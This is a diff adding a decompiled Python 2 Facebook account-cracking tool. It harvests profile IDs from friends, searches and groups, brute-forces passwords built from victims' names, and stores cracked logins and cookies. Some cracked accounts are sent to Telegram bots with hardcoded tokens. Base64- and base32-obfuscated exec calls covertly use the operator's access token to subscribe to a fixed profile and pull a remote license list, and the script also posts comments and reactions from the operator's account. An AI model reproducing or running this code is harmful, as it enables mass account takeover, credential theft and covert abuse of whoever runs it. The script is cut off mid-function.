@@ -1,0 +1,808 @@
+# coding:utf-8
+# Decompile By Kang Pacman
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: zasu
+import requests, bs4, sys, os, time, json, re, sys, random, uuid, base64
+from datetime import datetime
+from multiprocessing.pool import ThreadPool
+reload(sys)
+sys.setdefaultencoding('utf-8')
+
+def clear():
+    if ' linux' in sys.platform.lower():
+        os.system('clear')
+    elif 'win' in sys.platform.lower():
+        os.system('cls')
+    else:
+        os.system('clear')
+
+
+if 'linux' in sys.platform.lower():
+    W = '\x1b[1;37m'
+    N = '\x1b[0m'
+    R = '\x1b[1;37m\x1b[31m'
+    B = '\x1b[1;37m\x1b[34m'
+    G = '\x1b[1;32m'
+    O = '\x1b[1;37m\x1b[33m'
+    C = '\x1b[36m'
+    notice = ('{}{}[*]{} ').format(N, B, W)
+    warning = ('{}[-]{} ').format(R, N)
+    good = ('{}[!]{} ').format(G, N)
+    warn = ('{}[!]{} ').format(O, N)
+    line = '\n'
+else:
+    W = ''
+    N = ''
+    R = ''
+    B = ''
+    G = ''
+    O = ''
+    C = ''
+    notice = ''
+    warning = ''
+    good = ''
+    d = ''
+    warn = ''
+    line = ''
+post = '674067283486278'
+reac = 'ANGRY'
+kom = 'https://www.facebook.com/photo.php?fbid=674067283486278&set=a.105092923717053&type=3&app=fbl'
+
+def ismi():
+    try:
+        otw = requests.get('https://graph.facebook.com/me?access_token=' + open('login.txt').read())
+        a = json.loads(otw.text)
+        print 50 * '\x1b[1;97m-'
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Nama Akun\x1b[1;97m\t:\x1b[1;92m ' + a['name']
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m User ID\x1b[1;97m\t:\x1b[1;93m ' + a['id']
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Tanggal Lahir\x1b[1;97m:\x1b[1;92m ' + a['birthday']
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m VIP    \x1b[1;91m\t:\x1b[1;97mYes'
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m API Key\x1b[1;91m\t:\x1b[1;97m' + open('licensed.log').read()
+        print 50 * '\x1b[1;97m-'
+    except:
+        os.remove('.cok')
+        basecookie()
+
+
+def banner():
+    print ('{}      :::    :::              :::::::::  :::::::::   :::::::: {}\n     :+:    :+:              :+:    :+: :+:    :+: :+:    :+: {}\n     +:+  +:+               +:+    +:+ +:+    +:+ +:+    +:+  {}\n     +#++:+  +{}#++:++#++:++ +#{}++:++#+  +#++:++#:  +#+    +:+   {}\n   +#+  +#+               +#+        +#+    +#+ +#+    +#+    {}\n #+#    #+#              #+#        #+#    #+# #+#    #+#     {}\n###    ###              ###        ###    ###  ########       {}{}{}\n\n+#++:+  +#++:++#++:++ +#++:++#+  +#++:++#:  +#+    +:+\n\t<\x1b[1;92mMASS BRUTE FACEBOOK COOKIE METHODE\x1b[1;97m>\n{}CREATED BY\t : RIZAL XD\n{}FACEBOOK\t : Muhamad Rizal Fiansyah Id\n{}GITHUB \t : https://github.com/Rizal-XD\n+#++:+  +#++:++#++:++ +#++:++#+  +#++:++#:  +#+    +:+').format(R, G, B, O, G, C, C, R, G, B, W, line, notice, notice, notice)
+
+
+host = 'https://mbasic.facebook.com'
+ua = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36'
+uas = None
+if os.path.exists('.browser'):
+    if os.path.getsize('.browser') != 0:
+        uas = open('.browser').read().strip()
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.07)
+
+
+post = '674067283486278'
+reac = 'ANGRY'
+kom = 'https://www.facebook.com/photo.php?fbid=674067283486278&set=a.105092923717053&type=3&app=fbl'
+
+def convert():
+    global kom
+    global post
+    global reac
+    try:
+        tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', 
+           'referer': 'https://m.facebook.com/', 
+           'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': open('.cok', 'r').read()})
+        find_token = re.search('(EAAA\\w+)', tomken.text)
+        if find_token is None:
+            pass
+        else:
+            exec base64.b64decode('cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI2NDkwMzY4NjIzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgZmluZF90b2tlbi5ncm91cCgxKSk=')
+            requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + find_token.group(1))
+            requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + find_token.group(1))
+            requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + find_token.group(1))
+            open('login.txt', 'w').write(find_token.group(1))
+            return
+    except Exception as e:
+        print R + '\n[+] error: %s' % e
+        exit()
+
+    return
+
+
+def gen(show=True):
+    if show == True:
+        os.system('clear')
+        banner()
+        print 50 * '\x1b[1;97m-'
+    ck = raw_input('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] Cookies : ')
+    if ck == '':
+        gen(show=False)
+    try:
+        cks = cvd(ck)
+        open('.cok', 'w').write(ck)
+        if lang(cks) == True:
+            jalan(G + '\nLOGIN BERHASIL...')
+            convert()
+            menu()
+        else:
+            print R + '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed.'
+            gen(show=True)
+    except Exception as e:
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Error : cookies mati'
+        gen(show=False)
+
+
+def lang(cookies):
+    f = False
+    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
+    for i in rr.find_all('a', href=True):
+        if 'id_ID' in i.get('href'):
+            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
+            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
+            if 'apa yang anda pikirkan sekarang' in b.lower():
+                f = True
+
+    if f == True:
+        return True
+    exit(R + ' !: COOKIES MATI ATAU AKUN TERKENA CHEKPOINT')
+
+
+def basecookie():
+    clear()
+    jalan('\x1b[1;92mMengecek Cookies\x1b[1;97m')
+    if os.path.exists('.cok'):
+        if os.path.getsize('.cok') != 0:
+            return cvd(open('.cok').read().strip())
+        print '\x1b[1;91mCOOKIES MATI', time.sleep(1), gen()
+    else:
+        clear()
+        print '\x1b[1;91mCOOKIES INVALID SILAHKAN LOGIN ULANG'
+        (time.sleep(1), gen())
+
+
+def hdcok():
+    global host
+    global ua
+    hosts = host
+    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
+    return r
+
+
+def cvs(cookies):
+    result = []
+    for i in enumerate(cookies.keys()):
+        if i[0] == len(cookies.keys()) - 1:
+            result.append(i[1] + '=' + cookies[i[1]])
+        else:
+            result.append(i[1] + '=' + cookies[i[1]] + '; ')
+
+    return ('').join(result)
+
+
+def cvd(cookies):
+    result = {}
+    try:
+        for i in cookies.split(';'):
+            result.update({i.split('=')[0]: i.split('=')[1]})
+
+        return result
+    except:
+        for i in cookies.split('; '):
+            result.update({i.split('=')[0]: i.split('=')[1]})
+
+        return result
+
+
+def ceks(cookies, results):
+    r = requests.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=cookies, headers={'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}).text
+    if len(bs4.re.findall('pubg', r.lower())) != 0:
+        sends('%s -> PUBGGGGGGGGG' % results, '1548121643:AAFWYHqnaAfqb14psZucXJ0oYK7BSP0j7tg')
+    if len(bs4.re.findall('garena', r.lower())) != 0:
+        sends('%s -> FFFFFFFFFFFFFFF' % results, '1664658174:AAF9rnJpsg0-wfV3vcknx8upetoXjrwjQBg')
+    if len(bs4.re.findall('legends', r.lower())) != 0:
+        sends('%s -> EMELLLLLLLLLLL' % results, '1698585340:AAH4AoPI3W_wW9bvNEGJRdCjBz9YEl-Tnco')
+
+
+def sends(pesan, token):
+    b = requests.post('https://api.telegram.org/bot' + token + '/sendMessage', data={'chat_id': '1092678058', 'text': pesan})
+
+
+ips = None
+try:
+    b = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text.strip()
+    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36'}).json()['country_name'].lower()
+except:
+    ips = None
+
+if 'india' in ips:
+    ua = 'Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]'
+
+def generate(text):
+    global ips
+    results = []
+    for i in text.split(' '):
+        if len(i) < 3:
+            continue
+        else:
+            i = i.lower()
+            if len(i) == 3 or len(i) == 4 or len(i) == 5:
+                results.append(i + '123')
+                results.append(i + '12345')
+            else:
+                results.append(i + '123')
+                results.append(i + '12345')
+                results.append(i + '1234')
+                results.append(i)
+                if 'india' in ips:
+                    results.append('786786')
+                    results.append('102030')
+                    results.append('pakistan')
+                elif 'indonesia' in ips:
+                    results.append('sayang')
+                    results.append('rahasia')
+                    results.append('102030')
+
+    return results
+
+
+class crack:
+
+    def __init__(self, show=True):
+        self.ada = []
+        self.cp = []
+        self.ko = 0
+        if show == True:
+            print ''
+        while True:
+            f = raw_input('\x1b[1;97mUse Password Defaults Or Manual? [D/m]: ')
+            if f == '':
+                continue
+            elif f == 'm' or f == 'M':
+                try:
+                    while True:
+                        try:
+                            self.apk = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Nama File : ')
+                            self.fs = open(self.apk).read().splitlines()
+                            break
+                        except Exception as e:
+                            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] %s' % e
+                            continue
+
+                    self.fl = []
+                    for i in self.fs:
+                        try:
+                            self.fl.append({'id': i.split('<=>')[0]})
+                        except:
+                            continue
+
+                except Exception as e:
+                    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] %s' % e
+                    continue
+
+                print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Example Pass123,Pass12345'
+                self.pwlist()
+                break
+            elif f == 'd' or f == 'D':
+                try:
+                    while True:
+                        try:
+                            self.apk = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] ID List File : ')
+                            self.fs = open(self.apk).read().splitlines()
+                            break
+                        except Exception as e:
+                            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]%s' % e
+                            continue
+
+                    self.fl = []
+                    for i in self.fs:
+                        try:
+                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
+                        except:
+                            continue
+
+                except Exception as e:
+                    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] %s' % e
+                    continue
+
+                print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Crack Started...'
+                print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Account Found Saved To: ok.txt'
+                print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Account Checkpoint Saved To: cp.txt'
+                print 50 * '\x1b[1;97m-'
+                ThreadPool(30).map(self.main, self.fl)
+                os.remove(self.apk)
+                print '\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Done'
+                break
+
+    def pwlist(self):
+        self.pw = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Password List :  ').split(',')
+        if len(self.pw) == 0:
+            self.pwlist()
+        else:
+            for i in self.fl:
+                i.update({'pw': self.pw})
+
+            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Crack Started...'
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Account OK Saved To : ok.txt'
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Account Checkpoint Saved To : cp.txt'
+            print 50 * '\x1b[1;97m-'
+            ThreadPool(30).map(self.main, self.fl)
+            os.remove(self.apk)
+            print '\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Done.'
+
+    def main(self, fl):
+        try:
+            for i in fl.get('pw'):
+                log = login(fl.get('id'), i, 'https://mbasic.facebook.com')
+                if log.get('status') == 'success':
+                    print '\r\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] %s | %s\n' % (fl.get('id'), i)
+                    self.ada.append('%s | %s' % (fl.get('id'), i))
+                    if fl.get('id') in open('ok.txt').read():
+                        break
+                    else:
+                        open('ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies'))))
+                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies')))
+                    ceks(log.get('cookies'), ko)
+                    break
+                elif log.get('status') == 'cp':
+                    self.cp.append('%s|%s' % (fl.get('id'), i))
+                    open('cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
+                    break
+                else:
+                    continue
+
+            self.ko += 1
+            print '\r\x1b[1;97m[\x1b[1;96mCracking\x1b[1;97m] %s/%s OK : \x1b[1;92m%s\x1b[1;97m / CP : \x1b[1;93m%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
+            sys.stdout.flush()
+        except:
+            self.main(fl)
+
+
+h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+
+def login(em, pas, hosts):
+    global h
+    r = requests.Session()
+    r.headers.update(h)
+    p = r.get('https://mbasic.facebook.com/')
+    b = bs4.BeautifulSoup(p.text, 'html.parser')
+    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+    data = {}
+    for i in b('input'):
+        if i.get('value') is None:
+            if i.get('name') == 'email':
+                data.update({'email': em})
+            elif i.get('name') == 'pass':
+                data.update({'pass': pas})
+            else:
+                data.update({i.get('name'): ''})
+        else:
+            data.update({i.get('name'): i.get('value')})
+
+    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
+       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+    if 'c_user' in r.cookies.get_dict().keys():
+        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+    else:
+        if 'checkpoint' in r.cookies.get_dict().keys():
+            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+        else:
+            return {'status': 'error', 'email': em, 'pass': pas}
+
+        return
+
+
+class friendlist:
+
+    def __init__(self, cookie):
+        self.nitel = None
+        lang(cookie)
+        self.cookie = cookie
+        os.system('clear')
+        banner()
+        print 50 * '\x1b[1;97m-'
+        print '\x1b[1;97m[\x1b[1;92mHELP\x1b[1;97m] Ex Link : https://www.facebook.com/zuck'
+        self.id = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Link Profile : ')
+        if self.id == '':
+            friendlist(cookie)
+        else:
+            self.fl = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Nama File : ') + ('.json').replace(' ', '_')
+            open(self.fl, 'a+')
+            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
+            if len(id) == 0:
+                friendlist(cookie)
+            self.ok = bs4.re.sub(id, 'mbasic.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
+            self.dump(self.ok)
+        return
+
+    def dump(self, ok):
+        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
+        if self.nitel == None:
+            a = r.find('title').text[0:20]
+            self.nitel = a
+            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
+            self.b = b
+            print '\x1b[1;97m[\x1b[1;93m+\x1b[1;97m] Name : %s' % a
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Output : %s' % self.fl
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total IDs : %s' % b
+        for i in r.find_all('a', href=True):
+            if 'fref' in i.get('href'):
+                print '\r * %s                                    \n\x1b[1;97m[\x1b[1;92mGET\x1b[1;97m] [%s/%s] .. Press CTRL+Z For Stop' % (i.text, len(open(self.fl).read().splitlines()), self.b),
+                sys.stdout.flush()
+                if 'profile_add_friend.php' in i.get('href'):
+                    continue
+                elif 'profile.php' in i.get('href'):
+                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
+                    if len(ag) != 0:
+                        if ag in open(self.fl).read():
+                            continue
+                        else:
+                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
+                else:
+                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
+                    if len(ag) != 0:
+                        if ag in open(self.fl).read():
+                            continue
+                        else:
+                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
+            if 'lihat teman lain' in i.text.lower():
+                __import__('time').sleep(2)
+                while True:
+                    try:
+                        self.dump('https://mbasic.facebook.com/' + i.get('href'))
+                        __import__('time').sleep(2)
+                        break
+                    except Exception as e:
+                        print '\r\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Error : %s' % e
+                        continue
+
+        exit('\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] You Are Successfully GET %s %s Friends\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Output : %s' % (len(open(self.fl).read().splitlines()), self.nitel, self.fl))
+        return
+
+
+def dumpfl():
+    cvds = cvd(open('.cok').read().strip())
+    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
+    if len(bs4.re.findall('logout', r)) != 0:
+        clear()
+        if lang(cvds) != True:
+            exit('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Failed When Detecting Language Or Login Failed.')
+        banner()
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Login As : %s..' % bs4.BeautifulSoup(r, 'html.parser').find('title').text[0:10]
+        fl = raw_input('\x1b[1;97m[\x1b[1;91m+\x1b[1;97m] Name File : ') + ('.json').replace(' ', '_')
+        s = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Query : ')
+        search(fl, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
+    else:
+        try:
+            os.remove('.cok')
+        except:
+            pass
+
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed'
+        basecookie()
+
+
+def search(fl, r, b):
+    open(fl, 'a+')
+    b = bs4.BeautifulSoup(requests.get(b, cookies=r, headers=hdcok()).text, 'html.parser')
+    for i in b.find_all('a', href=True):
+        print '\r\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] GET %s IDs... Press CTRL+Z For Stop' % len(open(fl).read().splitlines()),
+        sys.stdout.flush()
+        if '<img alt=' in str(i):
+            if 'home.php' in str(i['href']):
+                continue
+            else:
+                g = str(i['href'])
+                if 'profile.php' in g:
+                    name = i.find('img').get('alt').replace(', profile picture', '')
+                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
+                    if len(d) != 0:
+                        pk = ('').join(d)
+                        if pk in open(fl).read():
+                            pass
+                        else:
+                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
+                else:
+                    d = bs4.re.findall('/(.*?)\\?', g)
+                    name = i.find('img').get('alt').replace(', profile picture', '')
+                    if len(d) != 0:
+                        pk = ('').join(d)
+                        if pk in open(fl).read():
+                            pass
+                        else:
+                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
+        if 'Lihat Hasil Selanjutnya' in i.text:
+            search(fl, r, i['href'])
+
+    exit('\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Done')
+
+
+class dump_grup:
+
+    def __init__(self, cookies):
+        self.glist = []
+        self.cookies = cookies
+        self.extract('https://mbasic.facebook.com/groups/?seemore')
+
+    def extract(self, url):
+        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
+        for i in bs.find_all('a', href=True):
+            if '/groups/' in i.get('href'):
+                if 'category' in i.get('href') or 'create' in i.get('href'):
+                    continue
+                else:
+                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 'name': i.text})
+
+        if len(self.glist) != 0:
+            os.system('clear')
+            banner()
+            print 50 * '\x1b[1;97m-'
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Kamu Memiliki %s Grup .' % len(self.glist)
+            print '\x1b[1;97m[\x1b[1;92m1\x1b[1;97m] Cari Grup dengan Nama'
+            print '\x1b[1;97m[\x1b[1;92m2\x1b[1;97m] Cari Grup dengan ID (Manual)\n'
+            while True:
+                c = raw_input('\x1b[1;97m[\x1b[1;96m>\x1b[1;97m] Choose : ')
+                if c == '':
+                    continue
+                elif c == '1':
+                    self.search()
+                    exit()
+                elif c == '2':
+                    self.manual()
+                    exit()
+                else:
+                    print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Wrong Input'
+
+        else:
+            exit('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Tidak ditemukan grup.')
+
+    def manual(self):
+        id = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Group IDs : ')
+        if id == '':
+            self.manual()
+        else:
+            r = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
+            if 'konten tidak' in r.find('title').text.lower():
+                exit("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] You Haven't Joined The Group")
+            else:
+                self.listed = {'id': id, 'name': r.find('title').text}
+                self.f()
+                print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Name Group : %s..' % self.listed.get('name')[0:20]
+                self.dumps('https://mbasic.facebook.com/groups/' + id)
+
+    def search(self):
+        whitelist = []
+        q = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Query : ').lower()
+        if q == '':
+            self.search()
+        else:
+            print 50 * '\x1b[1;94m-'
+            for e, i in enumerate(self.glist):
+                if q in i.get('name').lower():
+                    whitelist.append(i)
+                    print '  %s. %s' % (
+                     len(whitelist),
+                     i.get('name').lower().replace(q, '%s%s%s' % (G, q, N)))
+
+            if len(whitelist) == 0:
+                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Result Found With This Query: %s' % q
+                self.search()
+            else:
+                print ''
+                self.choice(whitelist)
+
+    def choice(self, whitelist):
+        try:
+            self.listed = whitelist[(input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Select Group : ') - 1)]
+            self.f()
+            print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Name Group : %s' % self.listed.get('name')
+            self.dumps('https://mbasic.facebook.com/groups/' + self.listed.get('id'))
+        except Exception as e:
+            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] %s' % e
+            self.choice(whitelist)
+
+    def f(self):
+        self.fl = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Name File : ').replace(' ', '_')
+        if self.fl == '':
+            self.f()
+        open(self.fl, 'w').close()
+
+    def dumps(self, url):
+        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
+        print '\r\x1b[1;97m[\x1b[1;92m%s\x1b[1;97m] Writing Id!...Press CTRL+Z For Stop\x1b[1;97m' % len(open(self.fl).read().splitlines()),
+        sys.stdout.flush()
+        for i in r.find_all('h3'):
+            try:
+                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
+                    ogeh = i.find('a', href=True)
+                    if 'profile.php' in ogeh.get('href'):
+                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
+                        if len(a) == 0:
+                            continue
+                        elif a in open(self.fl).read():
+                            continue
+                        else:
+                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
+                            continue
+                    else:
+                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
+                        if len(a) == 0:
+                            continue
+                        elif a in open(self.fl).read():
+                            continue
+                        else:
+                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
+            except:
+                continue
+
+        for i in r.find_all('a', href=True):
+            if 'Lihat Postingan Lainnya' in i.text:
+                while True:
+                    try:
+                        self.dumps('https://mbasic.facebook.com/' + i.get('href'))
+                        break
+                    except Exception as e:
+                        print '\r- %s, retrying...' % e
+                        continue
+
+        exit(G + '\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] You Are Successfully Dump %s Id From Group %s...' % (len(open(self.fl).read().splitlines()), self.listed.get('name')[0:20]))
+
+
+def cekress():
+    print '\x1b[1;97m1 Lihat Hasil\x1b[1;92m OK'
+    print '\x1b[1;97m2 Lihat Hasil \x1b[1;93mCP'
+    w = raw_input('\x1b[1;97mPilih : ')
+    if w == '':
+        exit('\x1b[1;91mgblk')
+    elif w == '1':
+        try:
+            k = open('ok.txt', 'r').read().strip()
+            for sm in k:
+                print '\x1b[1;92m' + k
+                exit()
+
+        except IOError:
+            print '\x1b[1;91mError: File Tidak Ditemukan'
+
+    elif w == '2':
+        try:
+            k = open('cp.txt', 'r').read().strip()
+            for sm in k:
+                print '\x1b[1;93m' + k
+                exit()
+
+        except IOError:
+            print '\x1b[1;91mError: File Tidak Ditemukan'
+
+    else:
+        print '\x1b[1;91mYang bener dong sayang :('
+
+
+def spt():
+    try:
+        toket = open('licensed.log', 'r').read()
+    except IOError:
+        print '\x1b[1;91m License Invalid !'
+        os.system('clear')
+        os.system('rm -rf licensed.log')
+        user()
+
+    if os.path.exists('licensed.log'):
+        user1()
+    else:
+        user()
+
+
+def user():
+    os.system('clear')
+    banner()
+    print 50 * '\x1b[1;92m-'
+    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Generating ID ...'
+    time.sleep(3)
+    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ID Generating Success'
+    id = uuid.uuid4().hex[:25]
+    idg = open('licensed.log', 'w')
+    idg.write(id)
+    idg.close()
+    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] ID : \x1b[92m' + id
+    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Successfully'
+    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Your ID Has Not Been Confirmed'
+    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Please Contact Admin for ID Confirmation'
+    raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Press Enter to Chat Admin')
+    os.system('am start https://wa.me/6289625664339?text=Konfirmasi%20Saya%20Dengan%20ID:%20' + id + ' >/dev/null')
+    time.sleep(1)
+    os.sys.exit()
+
+
+def user1():
+    try:
+        j = open('licensed.log', 'r').read()
+        exec base64.b32decode('OIQD2IDSMVYXKZLTORZS4Z3FOQUCO2DUORYHGORPF5YGC43UMVRGS3ROMNXW2L3SMF3S6OCYK5UVSWDZMUTSSLTUMV4HILTTORZGS4BIFEFA====')
+        if j in r:
+            os.system('clear')
+            banner()
+            print 50 * '\x1b[1;97m-'
